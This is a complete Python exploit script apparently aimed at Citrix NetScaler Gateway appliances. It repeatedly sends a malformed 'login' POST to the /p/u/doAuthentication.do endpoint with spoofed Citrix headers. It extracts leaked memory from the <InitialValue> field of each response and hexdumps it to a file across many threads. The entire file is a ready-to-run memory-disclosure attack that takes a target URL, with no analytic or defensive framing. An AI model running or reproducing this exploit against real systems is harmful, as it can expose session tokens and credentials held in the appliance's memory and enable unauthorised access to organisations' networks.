import argparse
import requests
import hexdump
from concurrent.futures import ThreadPoolExecutor

from rich.console import Console
from rich.panel import Panel
import termcolor


requests.packages.urllib3.disable_warnings()
console = Console()

URL = ""
DONE = False
FILE = None
COUNT = 0

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="target URL")
    parser.add_argument("-t", "--threads", default=10, type=int, help="number of threads [10]")
    parser.add_argument("-o", "--output", default="leak.dump", help="output file [leak.dump]")
    return parser.parse_args()

def exploit(target: str):
    headers = {
        'X-Citrix-Am-Credentialtypes': 'none, username, domain, password, newpassword, passcode, savecredentials, textcredential, webview, nsg-epa, negotiate, nsg_push, nsg_push_otp, nf_sspr_rem, nsg-x1, nsg-setclient, nsg-eula, nsg-tlogin, nsg-fullvpn, nsg-hidden, nsg-auth-failure, nsg-auth-success, nsg-epa-success, nsg-l20n, GoBack, nf-recaptcha, ns-dialogue, nf-gw-test, nf-poll, nsg_qrcode, nsg_manageotp',
        'Sec-Ch-Ua': '"Not:A-Brand";v="24", "Chromium";v="134"',
        'Accept-Language': 'en-GB,en;q=0.9',
        'Sec-Ch-Ua-Mobile': '?0',
        'X-Citrix-Am-Labeltypes': 'none, plain, heading, information, warning, error, confirmation, image, nsg-epa, nsg-epa-failure, nsg-login-label, tlogin-failure-msg, nsg-tlogin-heading, nsg-tlogin-single-res, nsg-tlogin-multi-res, nsg-tlogin, nsg-login-heading, nsg-fullvpn, nsg-l20n, nsg-l20n-error, certauth-failure-msg, dialogue-label, nsg-change-pass-assistive-text, nsg_confirmation, nsg_kba_registration_heading, nsg_email_registration_heading, nsg_kba_validation_question, nsg_sspr_success, nf-manage-otp',
        'X-Citrix-Isusinghttps': 'Yes',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
        'Accept': 'application/xml, text/xml, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Priority': 'u=1, i',
        'Connection': 'keep-alive',
    }

    data = 'login'

    response = requests.post(f'{target}/p/u/doAuthentication.do', headers=headers, data=data, verify=False)
    return response

def leak():
    global COUNT
    while not DONE:
        resp = exploit(URL)
        leak = resp.content.split(b"<InitialValue>")[1].split(b"</InitialValue>")[0]
        if leak != b"false":
            length = str(len(leak))
            COUNT += len(leak)
            print(f"Leaked total of {termcolor.colored(str(COUNT), 'cyan', attrs=['bold'])} bytes\r", end="")
            print(f"=================={length}==================", file=FILE)
            dump = hexdump.hexdump(leak, result="return")
            print(dump, file=FILE)
            print(f"=================={'='*len(length)}==================", file=FILE)

def main():
    global URL, DONE, FILE
    args = get_args()
    URL = args.url.rstrip("/")
    threads = args.threads
    FILE = open(args.output, "w")
    console.print(
        Panel(
            f"[bold magenta]URL    [/bold magenta]\t\t[bold]{URL}[/bold]\n" \
            f"[bold magenta]THREADS[/bold magenta]\t\t[bold]{threads}[/bold]\n" \
            f"[bold magenta]OUTPUT [/bold magenta]\t\t[bold]{args.output}[/bold]"
        )
    )
    console.print("[bold green]Running...[/bold green]")
    console.print("[bold red]ENTER TO KILL[/bold red]")
    executor = ThreadPoolExecutor(max_workers=threads)
    for _ in range(threads):
        executor.submit(leak)
    try:
        input("")
    except:
        pass
    finally:
        DONE = True
        console.print("[yellow]Stopping threads...[/yellow]")
        executor.shutdown(wait=True)
        FILE.close()
        print()
        console.print("[bold green]Done.[/bold green]")

main()